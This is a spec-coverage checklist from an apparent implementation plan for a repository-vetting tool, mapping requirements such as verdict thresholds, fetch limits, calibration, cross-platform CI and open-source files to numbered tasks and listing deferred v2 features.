- [ ] **All 8 checks:** ✓ Tasks 16 (Q-tier), 17 (1/2/4/5), 18 (3), 19 (6/7/8).
- [ ] **High-confidence warns force red:** ✓ Tasks 8, 18, 19.
- [ ] **Quick-check emits 🟢 or 🟡 only:** ✓ Task 16.
- [ ] **Threshold-only warns cap at yellow:** ✓ Task 8 `compute_verdict`.
- [ ] **Fetch hardening (`--max-time`, `--max-filesize`):** ✓ Tasks 16, 19.
- [ ] **Output truncation (5 examples):** ✓ Task 19 (check 7).
- [ ] **Explicit-mode token + verification test:** ✓ Tasks 3, 12, 14.
- [ ] **Calibration script + pre-commit hook + justified-warns:** ✓ Tasks 9, 10, 11.
- [ ] **Directive, verdict-aware closing:** ✓ Task 20.
- [ ] **Edge cases (404, unauthenticated, rate limit, oversize fetch):** ✓ Task 20.
- [ ] **Self-test (`--self-test`):** ✓ Task 20.
- [ ] **Quick-check tighter thresholds (Q1: AND not OR; Q2: 500/day; Q6: allowlist):** ✓ Task 16.
- [ ] **Top-30 contributors for provenance:** ✓ Task 19.
- [ ] **Branch-aware memoization key:** ✓ Task 14.
- [ ] **Cross-platform (Linux / macOS / Windows):** ✓ Task 5 (`age_days`), Task 25 (CI on all three).

Open-source layer:
- [ ] **LICENSE (MIT):** ✓ Task 1.
- [ ] **SECURITY.md:** ✓ Task 21.
- [ ] **CONTRIBUTING.md:** ✓ Task 22.
- [ ] **CHANGELOG.md:** ✓ Task 23.
- [ ] **Issue + PR templates:** ✓ Task 24.
- [ ] **CI on 3 platforms + shellcheck:** ✓ Task 25.
- [ ] **Local installer + one-liner installer:** ✓ Tasks 26, 27.
- [ ] **Public README with badges and install:** ✓ Task 28.

Spec sections deferred to v2 (documented as future work, NOT tasks):
- Hosts beyond github.com
- Recursive transitive-dep scan
- Cross-session memoization cache
- Signed/hashed verdict format
- Curated publisher allowlist
- Localization

**No-placeholder check:** every code block contains complete, runnable
content. "TODO" only appears in Task 3's verification doc as fillable
fields for the human operator.

**Type / name consistency check:**
- All helper function names (`extract_url`, `has_intent_token`, `age_days`,
  `is_benign_install_hook`, `has_suspicious_pattern`, `is_forbidden_executable`,
  `is_in_recognized_build_path`, `is_empty_profile`, `compute_verdict`,
  `verdict_label`, `fetch_raw`) are defined once and called consistently.
- `MARKERS`, `ECOSYSTEMS`, `WARNS`, `HC_WARNS`, `SKIPS`, `FINDINGS`, `OWNER_REPO`,
  `BRANCH`, `MODE` — initialised in known tasks and consumed only downstream
  of their definition.
- SKILL.md section headings are grepped in structural tests — any rename
  would immediately break the test suite.
